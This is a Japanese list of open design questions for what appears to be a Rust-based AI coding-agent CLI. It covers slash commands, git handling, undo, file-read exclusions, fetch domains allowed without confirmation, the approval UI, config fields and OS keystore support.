- `/` で始まるコマンドの一覧（別に検討する）。
- git のブランチの操作（別に検討する）と、G3 の道具の一覧の見直し（実装の前）。
- 入力の履歴を利用者ごとに一つにするか、プロジェクトごとに分けるか。
- 巻き戻しの「決めること」（`create_project` の取り消し、確認の記録の扱い、記録の大きさと期間）。
- 【要検証】hooks などを実行しない git のライブラリ。Codex CLI の `/undo` の作りの公式の文書での確認。
- `read_file` が既定で読まないファイルの一覧。
- 確認なしで取得できるドメインの一覧の既定と、ウェブの検索の手段（提供者の検索の機能か、検索の API か。【要検証】）。
- TUI の画面の構成と、承認の画面（ADR 0188）との関係（OPEN-056）。
- 設定ファイルの「決めること」。
- プロジェクトの設定ファイルで書ける欄の一覧（モデル以外のハーネスの設定のうち、どれをプロジェクトで変えられるか）。
- キーの優先順位の具体的な順。
- 【要検証】Rust で OS のキーストアを扱う crate（`keyring` など）の対応の範囲（Linux の Secret Service がない環境、ヘッドレスの環境での振る舞い）。
